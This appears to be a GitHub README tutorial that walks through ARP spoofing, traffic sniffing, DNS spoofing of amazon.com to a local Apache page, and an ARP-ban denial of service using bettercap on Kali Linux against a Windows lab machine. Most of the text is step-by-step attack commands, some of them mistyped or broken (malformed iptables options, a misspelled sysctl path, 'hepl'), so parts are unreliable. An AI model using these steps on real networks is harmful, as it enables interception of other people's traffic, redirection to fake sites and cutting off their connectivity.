# Dns-Spoofing-with-bettercap
DNS Spoofing: How to Perform the Attack
To execute DNS spoofing, we will require a Kali Linux machine and a target machine running Windows 7, XP, or 10. Now, let's proceed!
![Anwer Lahami](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/DNS-spoofing.jpg)
### installing bettercap :
Bettercap is written in Go and provides a variety of features for interacting with networks, capturing and analyzing data, and performing various security-related tasks.
```
sudo apt-get update
sudo apt install bettercap
```
### lunching Bettercap: 
we can now lunch it using :
```
sudo bettercap
```
![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/0292bf7c-1b96-424b-924b-2b639f8372fa)

then type ```help``` 

![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/b3e30087-72bd-49d1-abf0-317f2ed9c7cb)

we can see net.probe && net.recon are not running , net.probe : this module will send different types of probe packets to each IP in the current subnet in order for the net.recon module to detect them.
to activate it: 

```
net.probe on
```

![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/8ac8972c-03df-48b6-89af-ec0818e467c6)

![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/3ca31fca-9f19-458a-829f-c5639502fa6e)

### ARP spoof attack:
first let's check the table arp in our target machine

![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/ac5bf67a-c2c7-42e7-beea-528b65fbcf71)

we can see the adrees of the router and our Kali machine
then let's from our machine check the module ARP.spoof using:
```
help arp.spoof
```

![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/a34af5aa-93aa-4c3c-96b5-05d5d54b8049)

#### setting the environnement for the attack
Let's execute the following command:
```set arp.spoof.fullduplex true``` 
this means that we will target both the router and the target machine (in our case windowsXP) 
!!! if the router has ARP spoofing protections in place this will make the attack fail (default=false)
```
set arp.spoof.target @ip Target machine
```
NOTE: we can replace @ip target machine with a range of address seperated by a commas or a subnet
to sniff the traffic and redirect to our machine 
```
set net.sniff.local true
```
we can type 
```
help net.sniff to see more infomation
```
![image](https://github.com/anouerr357/Dns-Spoofing-with-bette
rcap/assets/124587170/161885a6-e95c-46d8-a072-01eaa1ae5b01)
#### executing the attack
```
arp.spoof on
net.sniff on
```
WARNING: in some case will see this type of message 

![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/6e48d7c7-ac49-43c0-9ab6-225d3b00b3c6)

#### solving the issue :
!! first insure that your apache2 serveur is stopped
else:
we need to redirect the packet in and out of our machine so we need to set the machine to forward the packets:
```
iptables -arp -a FORWARD -i (your interface in my case 'eth0') -j ACCEPT
iptables -arp -a FORWARD -o (your interface in my case 'eth0') -j ACCEPT
nano /etc/systcl.conf
```
![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/2dabac88-e54a-482b-9375-f0484e4910c4)

now we can see the raffic of the target machine and let's check it's arp table:

![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/89a095a5-e9ce-4d49-88ee-ef6da9712d43)

We can even visualize and see the data sended it in the http mode 

![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/a078902b-1da0-4b66-afef-421797d2e6d9)

this attack is not available now since many website disable their http version 
###DNS spoofing
Now we are going to spoof a DNS
let's see the module in bettercap using:

```
hepl dns.spoof
```

![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/536274db-d932-4aaa-ad6f-40b8b0e6ec8e)

what we want to do here is to take a domain and spoof it back to my IP address
first let's start our apache2 server:
```
sudo service apache2 start
```
if we type 127.0.0.1 in ou kali machine we can see the index  page :
! if your asking how change the index.html file just do the following commands:
```
cd /var/www/html
sudo nano index.html
```
![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/ccd2cfe9-60a1-4220-9439-9c57a36f38c9)

then let's go to our terminal:
```
set dns.spoof.domains amazon.com
set dns.spoof.address @ip_kali
dns.spoof on 
```
![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/dd901841-ef02-4349-a973-f4af9b8bab81)

now let's go to the target and type: amazon.com

![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/71ac0d35-818a-42b7-a0be-fad53a6163b2)

### DOS using ARP 
```
arp.ban on
```
![image](https://github.com/anouerr357/Dns-Spoofing-with-bettercap/assets/124587170/3c3d4c50-d1a2-45c6-a6d0-16732bb48028)

Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.

for additionnal informations:
https://www.bettercap.org/modules

